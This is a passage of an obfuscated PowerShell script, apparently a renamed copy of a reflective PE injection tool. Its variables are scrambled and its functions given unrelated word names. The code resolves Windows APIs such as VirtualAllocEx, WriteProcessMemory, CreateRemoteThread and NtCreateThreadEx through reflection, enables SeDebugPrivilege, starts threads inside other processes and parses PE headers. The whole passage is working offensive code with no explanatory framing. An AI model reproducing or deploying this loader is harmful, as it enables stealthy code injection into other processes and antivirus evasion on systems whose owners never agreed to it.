		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}
	Function exposing
	{
		$GMTlJquq99 = New-Object System.Object
		
		$BSDeQkOv99 = cassock kernel32.dll VirtualAlloc
		$RdgJNtmD99 = rafters @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$zlJmQoag99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($BSDeQkOv99, $RdgJNtmD99)
		$GMTlJquq99 | Add-Member NoteProperty -Name VirtualAlloc -Value $zlJmQoag99
		
		$aghpzFyx99 = cassock kernel32.dll VirtualAllocEx
		$DTIlmFZV99 = rafters @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$FnfpeqOd99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($aghpzFyx99, $DTIlmFZV99)
		$GMTlJquq99 | Add-Member NoteProperty -Name VirtualAllocEx -Value $FnfpeqOd99
		
		$CwGMXMnE99 = cassock msvcrt.dll memcpy
		$kkKVexhv99 = rafters @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$myOCxmEM99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CwGMXMnE99, $kkKVexhv99)
		$GMTlJquq99 | Add-Member -MemberType NoteProperty -Name memcpy -Value $myOCxmEM99
		
		$AYBgRqQQ99 = cassock msvcrt.dll memset
		$onWEYVqE99 = rafters @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$LweTqMPh99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AYBgRqQQ99, $onWEYVqE99)
		$GMTlJquq99 | Add-Member -MemberType NoteProperty -Name memset -Value $LweTqMPh99
		
		$KiNriBAt99 = cassock kernel32.dll LoadLibraryA
		$VehFSsQD99 = rafters @([String]) ([IntPtr])
		$hKzZhyRJ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($KiNriBAt99, $VehFSsQD99)
		$GMTlJquq99 | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $hKzZhyRJ99
		
		$TdFhmMow99 = cassock kernel32.dll GetProcAddress
		$cdmdlXTi99 = rafters @([IntPtr], [String]) ([IntPtr])
		$AtcdUOHK99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($TdFhmMow99, $cdmdlXTi99)
		$GMTlJquq99 | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $AtcdUOHK99
		
		$tKjyEXFd99 = cassock kernel32.dll GetProcAddress
		$BmyOAgry99 = rafters @([IntPtr], [IntPtr]) ([IntPtr])
		$LuegzOZm99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($tKjyEXFd99, $BmyOAgry99)
		$GMTlJquq99 | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $LuegzOZm99
		
		$fBNEdSXU99 = cassock kernel32.dll VirtualFree
		$KPOHACLH99 = rafters @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$eypKKpuM99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($fBNEdSXU99, $KPOHACLH99)
		$GMTlJquq99 | Add-Member NoteProperty -Name VirtualFree -Value $eypKKpuM99
		
		$GDJvuNlN99 = cassock kernel32.dll VirtualFreeEx
		$cyBmgbOv99 = rafters @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$sydYmOIQ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GDJvuNlN99, $cyBmgbOv99)
		$GMTlJquq99 | Add-Member NoteProperty -Name VirtualFreeEx -Value $sydYmOIQ99
		
		$XhYVhhQb99 = cassock kernel32.dll VirtualProtect
		$zurfSvPw99 = rafters @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$zAOVfsvl99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($XhYVhhQb99, $zurfSvPw99)
		$GMTlJquq99 | Add-Member NoteProperty -Name VirtualProtect -Value $zAOVfsvl99
		
		$xgnQeKmc99 = cassock kernel32.dll GetModuleHandleA
		$GbZpoJVg99 = rafters @([String]) ([IntPtr])
		$umwpUoWm99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($xgnQeKmc99, $GbZpoJVg99)
		$GMTlJquq99 | Add-Member NoteProperty -Name GetModuleHandle -Value $umwpUoWm99
		
		$gJeowInv99 = cassock kernel32.dll FreeLibrary
		$dunQKvVt99 = rafters @([IntPtr]) ([Bool])
		$CLUCASyd99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($gJeowInv99, $dunQKvVt99)
		$GMTlJquq99 | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $CLUCASyd99
		
		$vjKUNLbl99 = cassock kernel32.dll OpenProcess
	    $cptCqbBv99 = rafters @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $soJrXSsZ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vjKUNLbl99, $cptCqbBv99)
		$GMTlJquq99 | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $soJrXSsZ99
		
		$yzicmQBT99 = cassock kernel32.dll WaitForSingleObject
	    $vYYjBVhP99 = rafters @([IntPtr], [UInt32]) ([UInt32])
	    $XyQnOtFP99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($yzicmQBT99, $vYYjBVhP99)
		$GMTlJquq99 | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $XyQnOtFP99
		
		$GOqatUrC99 = cassock kernel32.dll WriteProcessMemory
        $tDvHNGdL99 = rafters @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $CDSdjmIW99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GOqatUrC99, $tDvHNGdL99)
		$GMTlJquq99 | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $CDSdjmIW99
		
		$RelfgvEX99 = cassock kernel32.dll ReadProcessMemory
        $lLLzLBlJ99 = rafters @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $FXaWOYFE99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RelfgvEX99, $lLLzLBlJ99)
		$GMTlJquq99 | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $FXaWOYFE99
		
		$wJOPEcgl99 = cassock kernel32.dll CreateRemoteThread
        $VYpMhQJR99 = rafters @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $QXQEvkXa99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($wJOPEcgl99, $VYpMhQJR99)
		$GMTlJquq99 | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $QXQEvkXa99
		
		$XIYQVoBy99 = cassock kernel32.dll GetExitCodeThread
        $hKWJUGTm99 = rafters @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $SSQbNYgd99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($XIYQVoBy99, $hKWJUGTm99)
		$GMTlJquq99 | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $SSQbNYgd99
		
		$XurCzFBu99 = cassock Advapi32.dll OpenThreadToken
        $owGfLNDQ99 = rafters @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $GEBsYZAp99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($XurCzFBu99, $owGfLNDQ99)
		$GMTlJquq99 | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $GEBsYZAp99
		
		$qLVRnmof99 = cassock kernel32.dll GetCurrentThread
        $qXXxdSwy99 = rafters @() ([IntPtr])
        $UxHVSexD99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($qLVRnmof99, $qXXxdSwy99)
		$GMTlJquq99 | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $UxHVSexD99
		
		$HGQLfiOm99 = cassock Advapi32.dll AdjustTokenPrivileges
        $MFrXwcSx99 = rafters @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $utFwADCZ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($HGQLfiOm99, $MFrXwcSx99)
		$GMTlJquq99 | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $utFwADCZ99
		
		$dTGFZeYu99 = cassock Advapi32.dll LookupPrivilegeValueA
        $kRxcvlGU99 = rafters @([String], [String], [IntPtr]) ([Bool])
        $PjNZNaeu99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($dTGFZeYu99, $kRxcvlGU99)
		$GMTlJquq99 | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $PjNZNaeu99
		
		$EmorwrTa99 = cassock Advapi32.dll ImpersonateSelf
        $vOxoRZMF99 = rafters @([Int32]) ([Bool])
        $CnNhpvmR99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($EmorwrTa99, $vOxoRZMF99)
		$GMTlJquq99 | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $CnNhpvmR99
		
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $sqFLIfaG99 = cassock NtDll.dll NtCreateThreadEx
            $cNjhOnsL99 = rafters @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $QaxlvKzl99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($sqFLIfaG99, $cNjhOnsL99)
		    $GMTlJquq99 | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $QaxlvKzl99
        }
		
		$iyxqUKAV99 = cassock Kernel32.dll IsWow64Process
        $qcGFWGCQ99 = rafters @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $NWjRAvSb99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($iyxqUKAV99, $qcGFWGCQ99)
		$GMTlJquq99 | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $NWjRAvSb99
		
		$yJReWKaX99 = cassock Kernel32.dll CreateThread
        $WFXOPLhk99 = rafters @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $NwmlIgcm99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($yJReWKaX99, $WFXOPLhk99)
		$GMTlJquq99 | Add-Member -MemberType NoteProperty -Name CreateThread -Value $NwmlIgcm99
	
		$JiWicaBt99 = cassock kernel32.dll VirtualFree
		$PbWoIWzo99 = rafters @([IntPtr])
		$avwbeUOW99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($JiWicaBt99, $PbWoIWzo99)
		$GMTlJquq99 | Add-Member NoteProperty -Name LocalFree -Value $avwbeUOW99
		return $GMTlJquq99
	}
			
	Function swerving
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$yBAXEjBI99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$YeulucGZ99
		)
		
		[Byte[]]$iypGbkDZ99 = [BitConverter]::GetBytes($yBAXEjBI99)
		[Byte[]]$SJzVqqCI99 = [BitConverter]::GetBytes($YeulucGZ99)
		[Byte[]]$yDYVnvBW99 = [BitConverter]::GetBytes([UInt64]0)
		if ($iypGbkDZ99.Count -eq $SJzVqqCI99.Count)
		{
			$suBvXPNn99 = 0
			for ($i = 0; $i -lt $iypGbkDZ99.Count; $i++)
			{
				$Val = $iypGbkDZ99[$i] - $suBvXPNn99
				if ($Val -lt $SJzVqqCI99[$i])
				{
					$Val += 256
					$suBvXPNn99 = 1
				}
				else
				{
					$suBvXPNn99 = 0
				}
				
				
				[UInt16]$Sum = $Val - $SJzVqqCI99[$i]
				$yDYVnvBW99[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($yDYVnvBW99, 0)
	}
	
	Function teepee
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$yBAXEjBI99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$YeulucGZ99
		)
		
		[Byte[]]$iypGbkDZ99 = [BitConverter]::GetBytes($yBAXEjBI99)
		[Byte[]]$SJzVqqCI99 = [BitConverter]::GetBytes($YeulucGZ99)
		[Byte[]]$yDYVnvBW99 = [BitConverter]::GetBytes([UInt64]0)
		if ($iypGbkDZ99.Count -eq $SJzVqqCI99.Count)
		{
			$suBvXPNn99 = 0
			for ($i = 0; $i -lt $iypGbkDZ99.Count; $i++)
			{
				[UInt16]$Sum = $iypGbkDZ99[$i] + $SJzVqqCI99[$i] + $suBvXPNn99
				$yDYVnvBW99[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$suBvXPNn99 = 1
				}
				else
				{
					$suBvXPNn99 = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($yDYVnvBW99, 0)
	}
	
	Function guesses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$yBAXEjBI99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$YeulucGZ99
		)
		
		[Byte[]]$iypGbkDZ99 = [BitConverter]::GetBytes($yBAXEjBI99)
		[Byte[]]$SJzVqqCI99 = [BitConverter]::GetBytes($YeulucGZ99)
		if ($iypGbkDZ99.Count -eq $SJzVqqCI99.Count)
		{
			for ($i = $iypGbkDZ99.Count-1; $i -ge 0; $i--)
			{
				if ($iypGbkDZ99[$i] -gt $SJzVqqCI99[$i])
				{
					return $true
				}
				elseif ($iypGbkDZ99[$i] -lt $SJzVqqCI99[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	
	Function Andrea
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$vPiQaaGV99 = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($vPiQaaGV99, 0))
	}
	
	
	Function deprecate
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$ItYCAMtj99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$rDgqxPNn99 = [IntPtr](teepee ($StartAddress) ($Size))
		
		$CvjzoSts99 = $PEInfo.EndAddress
		
		if ((guesses ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $ItYCAMtj99"
		}
		if ((guesses ($rDgqxPNn99) ($CvjzoSts99)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $ItYCAMtj99"
		}
	}
	
	
	Function personalize
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$iHYgyLYx99
		)
	
		for ($CMgqWDge99 = 0; $CMgqWDge99 -lt $Bytes.Length; $CMgqWDge99++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($iHYgyLYx99, $CMgqWDge99, $Bytes[$CMgqWDge99])
		}
	}
	
	Function rafters
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $tZsQGvio99 = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )
	    $jRJyNLkA99 = [AppDomain]::CurrentDomain
	    $NFhTzSSy99 = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $rWAnZuej99 = $jRJyNLkA99.DefineDynamicAssembly($NFhTzSSy99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $aqURcyKU99 = $rWAnZuej99.DefineDynamicModule('InMemoryModule', $false)
	    $NtiqnmeA99 = $aqURcyKU99.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $AFRpnJVU99 = $NtiqnmeA99.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $tZsQGvio99)
	    $AFRpnJVU99.SetImplementationFlags('Runtime, Managed')
	    $fNQilxfR99 = $NtiqnmeA99.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $tZsQGvio99)
	    $fNQilxfR99.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $NtiqnmeA99.CreateType()
	}
	Function cassock
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $uMzetqRl99
	    )
	    $ASGMBajM99 = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $jpUAaJWX99 = $ASGMBajM99.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    $umwpUoWm99 = $jpUAaJWX99.GetMethod('GetModuleHandle')
	    $AtcdUOHK99 = $jpUAaJWX99.GetMethod('GetProcAddress')
	    $bgzMaiUL99 = $umwpUoWm99.Invoke($null, @($Module))
	    $bIhuvWmk99 = New-Object IntPtr
	    $ZqklnLDt99 = New-Object System.Runtime.InteropServices.HandleRef($bIhuvWmk99, $bgzMaiUL99)
	    Write-Output $AtcdUOHK99.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$ZqklnLDt99, $uMzetqRl99))
	}
	
	
	Function deeding
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$GMTlJquq99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$wmxAHjcd99,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$LGDHPgwZ99 = $GMTlJquq99.GetCurrentThread.Invoke()
		if ($LGDHPgwZ99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$DyybabFQ99 = [IntPtr]::Zero
		[Bool]$tjxmMPpq99 = $GMTlJquq99.OpenThreadToken.Invoke($LGDHPgwZ99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$DyybabFQ99)
		if ($tjxmMPpq99 -eq $false)
		{
			$pdXjTAWE99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($pdXjTAWE99 -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$tjxmMPpq99 = $GMTlJquq99.ImpersonateSelf.Invoke(3)
				if ($tjxmMPpq99 -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$tjxmMPpq99 = $GMTlJquq99.OpenThreadToken.Invoke($LGDHPgwZ99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$DyybabFQ99)
				if ($tjxmMPpq99 -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $pdXjTAWE99"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$wmxAHjcd99.LUID))
		$tjxmMPpq99 = $GMTlJquq99.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($tjxmMPpq99 -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}
		[UInt32]$cdvqgZWa99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$wmxAHjcd99.TOKEN_PRIVILEGES)
		[IntPtr]$adwQutcl99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($cdvqgZWa99)
		$emqSrzhc99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($adwQutcl99, [Type]$wmxAHjcd99.TOKEN_PRIVILEGES)
		$emqSrzhc99.PrivilegeCount = 1
		$emqSrzhc99.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$wmxAHjcd99.LUID)
		$emqSrzhc99.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($emqSrzhc99, $adwQutcl99, $true)
		$tjxmMPpq99 = $GMTlJquq99.AdjustTokenPrivileges.Invoke($DyybabFQ99, $false, $adwQutcl99, $cdvqgZWa99, [IntPtr]::Zero, [IntPtr]::Zero)
		$pdXjTAWE99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($tjxmMPpq99 -eq $false) -or ($pdXjTAWE99 -ne 0))
		{
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($adwQutcl99)
	}
	
	
	Function Gainsborough
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$AWGiTHqY99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$YqtQuYje99 = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$GMTlJquq99
		)
		
		[IntPtr]$NUNKlyKG99 = [IntPtr]::Zero
		
		$tmFefBPk99 = [Environment]::OSVersion.Version
		if (($tmFefBPk99 -ge (New-Object 'Version' 6,0)) -and ($tmFefBPk99 -lt (New-Object 'Version' 6,2)))
		{
			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$VpmEVYmL99= $GMTlJquq99.NtCreateThreadEx.Invoke([Ref]$NUNKlyKG99, 0x1FFFFF, [IntPtr]::Zero, $AWGiTHqY99, $StartAddress, $YqtQuYje99, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$uBawFjgU99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($NUNKlyKG99 -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $VpmEVYmL99. LastError: $uBawFjgU99"
			}
		}
		else
		{
			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$NUNKlyKG99 = $GMTlJquq99.CreateRemoteThread.Invoke($AWGiTHqY99, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $YqtQuYje99, 0, [IntPtr]::Zero)
		}
		
		if ($NUNKlyKG99 -eq [IntPtr]::Zero)
		{
			Write-Verbose "Error creating remote thread, thread handle is null"
		}
		
		return $NUNKlyKG99
	}
	
	Function didactic
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$QeodNfcO99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$wmxAHjcd99
		)
		
		$oobCjRDD99 = New-Object System.Object
		
		$xYfUrCgm99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($QeodNfcO99, [Type]$wmxAHjcd99.IMAGE_DOS_HEADER)
		[IntPtr]$EAcJBGom99 = [IntPtr](teepee ([Int64]$QeodNfcO99) ([Int64][UInt64]$xYfUrCgm99.e_lfanew))
		$oobCjRDD99 | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $EAcJBGom99
		$xxSRJlVX99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($EAcJBGom99, [Type]$wmxAHjcd99.IMAGE_NT_HEADERS64)
		
	    if ($xxSRJlVX99.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($xxSRJlVX99.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$oobCjRDD99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $xxSRJlVX99
			$oobCjRDD99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$MOtNMlZM99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($EAcJBGom99, [Type]$wmxAHjcd99.IMAGE_NT_HEADERS32)
			$oobCjRDD99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $MOtNMlZM99
			$oobCjRDD99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $oobCjRDD99
	}
	Function hastier
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$jfneoYUd99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$wmxAHjcd99
		)
		
		$PEInfo = New-Object System.Object
		
		[IntPtr]$NBdWgRZS99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($jfneoYUd99.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($jfneoYUd99, 0, $NBdWgRZS99, $jfneoYUd99.Length) | Out-Null
		
		$oobCjRDD99 = didactic -QeodNfcO99 $NBdWgRZS99 -wmxAHjcd99 $wmxAHjcd99
		
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($oobCjRDD99.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($oobCjRDD99.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($oobCjRDD99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($oobCjRDD99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($oobCjRDD99.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($NBdWgRZS99)
		
		return $PEInfo
	}
	Function watching
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$QeodNfcO99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$wmxAHjcd99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($QeodNfcO99 -eq $null -or $QeodNfcO99 -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		$oobCjRDD99 = didactic -QeodNfcO99 $QeodNfcO99 -wmxAHjcd99 $wmxAHjcd99
		
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $QeodNfcO99
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($oobCjRDD99.IMAGE_NT_HEADERS)
